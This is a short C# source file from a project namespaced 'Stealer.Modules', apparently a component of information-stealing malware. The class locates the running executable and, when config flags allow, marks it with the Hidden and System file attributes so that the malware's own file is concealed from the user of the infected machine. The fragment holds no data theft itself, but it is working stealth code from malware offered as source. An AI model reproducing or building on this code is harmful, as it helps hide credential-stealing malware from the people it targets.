using System.IO;

namespace Stealer.Modules
{
    internal sealed class Attributes
    {
        // File path
        private static string executable = System.Reflection.Assembly.GetEntryAssembly().Location;
        private static FileInfo file = new FileInfo(executable);

        // Add 'hidden' attribute to file
        public static void set_hidden()
        {
            if (config.attribute_hidden)
                file.Attributes |= FileAttributes.Hidden;
        }

        // Add 'system' attribute to file
        public static void set_system()
        {
            if (config.attribute_system)
                file.Attributes |= FileAttributes.System;
        }
    }
}
